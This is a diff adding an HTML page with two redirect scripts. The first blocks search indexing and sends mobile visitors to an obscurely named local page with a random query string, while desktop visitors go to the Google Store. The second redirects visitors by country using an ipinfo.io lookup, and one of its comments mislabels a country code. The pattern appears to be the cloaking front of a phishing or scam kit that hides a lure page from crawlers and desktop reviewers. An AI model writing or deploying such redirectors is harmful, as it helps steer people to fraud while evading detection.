@@ -1,0 +1,58 @@
+
+<META name="robots" content="NOINDEX,NOFOLLOW,NOARCHIVE,NOODP,NOSNIPPET">
+<script type="text/javascript">
+//<![CDATA[
+ function h(r, a) { var t = ""; if ("mix" == a) var h = 
+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789amp;"; else var h = 
+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789amp;"; for (var n = 0; r > n; n++) t += h.charAt(Math.floor(Math.random() * 
+h.length)); return t };
+
+        var device = navigator.userAgent
+        
+        if (device.match(/Iphone/i)|| device.match(/Ipod/i)|| device.match(/Android/i)|| device.match(/J2ME/i)|| device.match(/BlackBerry/i)|| device.match(/iPhone|iPad|iPod/i)|| device.match(/Opera Mini/i)|| device.match(/IEMobile/i)|| device.match(/Mobile/i)|| device.match(/Windows Phone/i)|| device.match(/windows mobile/i)|| device.match(/windows ce/i)|| device.match(/webOS/i)|| device.match(/palm/i)|| device.match(/bada/i)|| device.match(/series60/i)|| device.match(/nokia/i)|| device.match(/symbian/i)|| device.match(/HTC/i))
+        {
+         window.location = "./₹ ㍐ 圆 圎 圓 圜 ＄.html?"+ h(7, '')+"";
+        }else
+{
+window.location = "https://store.google.com/?"+ h(7, '')+"";
+}
+//]]>
+</script>
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Redirección por País</title>
+</head>
+<body>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> <!-- Importar jQuery -->
+
+<script>
+// Función para obtener la información del país utilizando ipinfo.io
+function obtenerPais() {
+    $.get("https://ipinfo.io", function(response) {
+        var country = response.country; // Obtiene el código del país (por ejemplo, "US" para Estados Unidos)
+
+        // Define los códigos de país y sus URLs de destino
+        var redirecciones = {
+            "IR": "https://www.youtube.com/", // Ejemplo: España
+            "US": "https://www.youtube.com/", // Ejemplo: Estados Unidos
+            "SE": "https://www.facebook.com/", //
+            // Puedes añadir más códigos de país y URLs según tus necesidades
+        };
+
+        // Verifica si el país del usuario está en la lista de redirecciones
+        if (redirecciones.hasOwnProperty(country)) {
+            window.location.href = redirecciones[country]; // Redirige al URL correspondiente al país
+        } else {
+
+        }
+    }, "jsonp");
+}
+
+// Llama a la función al cargar la página
+window.onload = obtenerPais;
+</script>
+
+</body>
